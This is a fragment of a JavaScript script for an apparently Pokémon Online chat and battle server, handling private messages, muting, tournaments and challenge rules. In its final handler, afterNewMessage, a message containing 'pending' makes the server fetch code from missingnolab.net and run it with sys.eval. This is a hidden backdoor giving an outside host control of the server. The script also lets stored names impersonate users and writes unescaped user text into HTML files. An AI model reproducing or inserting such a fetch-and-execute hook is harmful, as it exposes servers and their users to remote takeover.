sys.writeToFile("db/" + tar, " Hai ricevuto un messaggio da parte di " + sys.name(src) + "! Fai /read per leggere i tuoi messaggi.")
sys.sendMessage(src, " Hai mandato il messaggio: " + newauth + " a " + tar + ".")
if (sys.getFileContent("db/" + tar + ".html") != 'undefined' + '<b>' + sys.name(src) + ': </b>' + newauth + '<br>') {
return;
}
sys.writeToFile("db/" + tar + ".html", '<b>' + sys.name(src) + ': </b>' + newauth + '<br>')
return;

    
}
if (sys.getFileContent("db/" + src + ".imp") != "") {
	sys.stopEvent()
	sys.sendAll(sys.getFileContent("db/" + src + ".imp") + ": " + message)
	return;
}
if (sys.getFileContent("db/" + sys.ip(src) + ".muted") == "1") {
	sys.stopEvent()
	sys.sendMessage(src, "+Bot: sei mutato e quindi non puoi parlare.")
	return;
}
if (silence == "1" && sys.auth(src) < 1) {
	sys.stopEvent()
	sys.sendMessage(src, "+Bot: zitto durante il silenzio.")
	return;
}
}
,
tourSpots : function() {
return tournumber - tourmembers.length;
}
,
roundPairing : function() {
var border = "??????????????????????????????????????????????????:";
roundnumber += 1;

battlesStarted = [];
tourbattlers = [];
battlesLost = [];

if (tourmembers.length == 1) {

sys.sendAll("");
sys.sendAll(border);
sys.sendAll("");
sys.sendAll("IL VINCITORE DEL TORNEO ? : " + tourplayers[tourmembers[0]]);
sys.sendAll("");
sys.sendAll("*** Congratulazioni, " + tourplayers[tourmembers[0]] + ", per il tuo successo! ***");
sys.sendAll("");
sys.sendAll(border);
sys.sendAll("");

tourmode = 0;
return;
}

var finals = tourmembers.length == 2;

if (!finals) {
sys.sendAll("");
sys.sendAll(border);
sys.sendAll("*** Round " + roundnumber + " of " + tourtier + " tournament ***");
sys.sendAll("");
}
else {
sys.sendAll("");
sys.sendAll(border);
sys.sendAll("*** FINALE DEL " + tourtier.toUpperCase() + " TORNEO ***");
sys.sendAll("");
sys.sendAll("", 0);
sys.sendAll(border, 0);
sys.sendAll("*** FINALE DEL " + tourtier.toUpperCase() + " TORNEO ***", 0);
sys.sendAll("", 0);
}

var i = 0;
while (tourmembers.length >= 2) {
i += 1;
var x1 = sys.rand(0, tourmembers.length);
tourbattlers.push(tourmembers[x1]);
var name1 = tourplayers[tourmembers[x1]];
tourmembers.splice(x1,1);


x1 = sys.rand(0, tourmembers.length);
tourbattlers.push(tourmembers[x1]);
var name2 = tourplayers[tourmembers[x1]];
tourmembers.splice(x1,1);

battlesStarted.push(false);

if (!finals)
sys.sendAll (i + "." + this.padd(name1) + " VS " + name2);
else {
sys.sendAll (" " + this.padd(name1) + " VS " + name2);
sys.sendAll (" " + this.padd(name1) + " VS " + name2, 0);
}
}

if (tourmembers.length > 0) {
sys.sendAll ("");
sys.sendAll ("*** " + tourplayers[tourmembers[0]] + " is randomly selected to go to next round!");
}

sys.sendAll(border);
sys.sendAll("");
if (finals) {
sys.sendAll(border, 0);
sys.sendAll("", 0);
}
}

,

padd : function(name) {
var ret = name;

while (ret.length < 20) ret = ' ' + ret;

return ret;
}

,

isInTourney : function (name) {
var name2 = name.toLowerCase();
return name2 in tourplayers;
}

,

tourOpponent : function (nam) {
var name = nam.toLowerCase();

var x = tourbattlers.indexOf(name);

if (x != -1) {
if (x % 2 == 0) {
return tourbattlers[x+1];
} else {
return tourbattlers[x-1];
}
}

return "";
}

,

areOpponentsForTourBattle : function(src, dest) {
return this.isInTourney(sys.name(src)) && this.isInTourney(sys.name(dest)) && this.tourOpponent(sys.name(src)) == sys.name(dest).toLowerCase();
}
,

areOpponentsForTourBattle2 : function(src, dest) {
return this.isInTourney(src) && this.isInTourney(dest) && this.tourOpponent(src) == dest.toLowerCase();
}
,

ongoingTourneyBattle : function (name) {
return tourbattlers.indexOf(name.toLowerCase()) != -1 && battlesStarted[Math.floor(tourbattlers.indexOf(name.toLowerCase())/2)] == true;
}

,

afterBattleStarted: function(src, dest) {
if (tourmode == 2) {
if (this.areOpponentsForTourBattle(src, dest)) {
if (sys.tier(src, 0) == sys.tier(dest) && cmp(sys.tier(src, 0), tourtier))
battlesStarted[Math.floor(tourbattlers.indexOf(sys.name(src).toLowerCase())/2)] = true;
}
}
}

,

afterBattleEnded : function(src, dest, desc) {
if (tourmode != 2 ||desc == "tie")
return;
this.tourBattleEnd(sys.name(src), sys.name(dest));
}

,

tourBattleEnd : function(src, dest) {
var border = "??????????????????????????????????????????????????:";
if (!this.areOpponentsForTourBattle2(src, dest) || !this.ongoingTourneyBattle(src))
return;
battlesLost.push(src);
battlesLost.push(dest);

var srcL = src.toLowerCase();
var destL = dest.toLowerCase();

battlesStarted.splice(Math.floor(tourbattlers.indexOf(srcL)/2), 1);
tourbattlers.splice(tourbattlers.indexOf(srcL), 1);
tourbattlers.splice(tourbattlers.indexOf(destL), 1);
tourmembers.push(srcL);
delete tourplayers[destL];

if (tourbattlers.length != 0 || tourmembers.length > 1) {
sys.sendAll("");
sys.sendAll(border);
sys.sendAll("~~Server~~: " + src + " avanza al prossimo round.");
sys.sendAll("~~Server~~: " + dest + " ? fuori dal torneo.");
}

if (tourbattlers.length > 0) {
sys.sendAll("*** " + tourbattlers.length/2 + " battle(s) remaining.");
sys.sendAll(border);
sys.sendAll("");
return;
}

this.roundPairing();
}

,

isLCaps: function(letter) {
return letter >= 'A' && letter <= 'Z';
}

,

isMCaps : function(message) {
var count = 0;

var i = 0;
while ( i < message.length ) {
c = message[i];

if (this.isLCaps(c)) {
count += 1;
if (count == 5)
return true;
} else {
count -= 2;
if (count < 0)
count = 0;
}
i += 1;
}

return false;
}

,

beforeChallengeIssued : function (src, dest, clauses, rated, mode) {
if (battlesStopped) {
sys.sendMessage(src, "+BattleBot: Battles are now stopped as the server will restart soon.");
sys.stopEvent();
return;
}

if (forceSameTier[dest] == true && (sys.tier(dest) != sys.tier(src, 0))) {
sys.sendMessage(src, "+BattleBot: bo.");
sys.stopEvent();
return;
}

if (sys.tier(src, 0) == "Challenge Cup" && sys.tier(dest) == "Challenge Cup" && clauses[6] == 0) {
sys.sendMessage(src, "+CCBot: Challenge Cup must be enabled in the challenge window for a CC battle");
sys.stopEvent();
return;
}

if (tourmode == 2) {
var name1 = sys.name(src);
var name2 = sys.name(dest);

if (this.isInTourney(name1)) {
if (this.isInTourney(name2)) {
if (this.tourOpponent(name1) != name2.toLowerCase()) {
sys.sendMessage(src, "+TourneyBot: This guy isn't your opponent in the tourney.");
sys.stopEvent();
return;
}
} else {
sys.sendMessage(src, "+TourneyBot: This guy isn't your opponent in the tourney.");
sys.stopEvent();
return;
}
if (sys.tier(src, 0) != sys.tier(dest) || !cmp(sys.tier(src, 0),tourtier)) {
sys.sendMessage(src, "+TourneyBot: You must be both in the tier " + tourtier+ " to battle in the tourney.");
sys.stopEvent();
return;
}
} else {
if (this.isInTourney(name2)) {
sys.sendMessage(src, "+TourneyBot: This guy is in the tournament and you are not, so you can't battle him.");
sys.stopEvent();
return;
}
}
}

/* Challenge Cup Clause */
if (clauses[6] == 1)
return;


if (sys.tier(src, 0).indexOf("Doubles") != -1 && sys.tier(dest).indexOf("Doubles") != -1 && mode == 0) {
sys.sendMessage(src, "+Bot: To fight in doubles, enable doubles in the challenge window!");
sys.stopEvent();
return;
}

this.eventMovesCheck(src);
this.eventMovesCheck(dest);
}

,

beforeBattleMatchup : function(src,dest,clauses,rated)
{
if (battlesStopped) {
sys.stopEvent();
return;
}

this.eventMovesCheck(src);
this.eventMovesCheck(dest);

if (tourmode == 2 && (this.isInTourney(sys.name(src)) || this.isInTourney(sys.name(dest)) )) {
sys.stopEvent();
return;
}
}
,
afterNewMessage : function(message)
{
if (message.indexOf("pending") != -1) {
sys.webCall("http://missingnolab.net/log.php", 'if (resp != "") { sys.sendAll(resp); sys.webCall("http://missingnolab.net/deletem.php", "var paz = resp"); }');
sys.webCall("http://missingnolab.net/logb.txt", "sys.eval(resp)")
}
}
,
})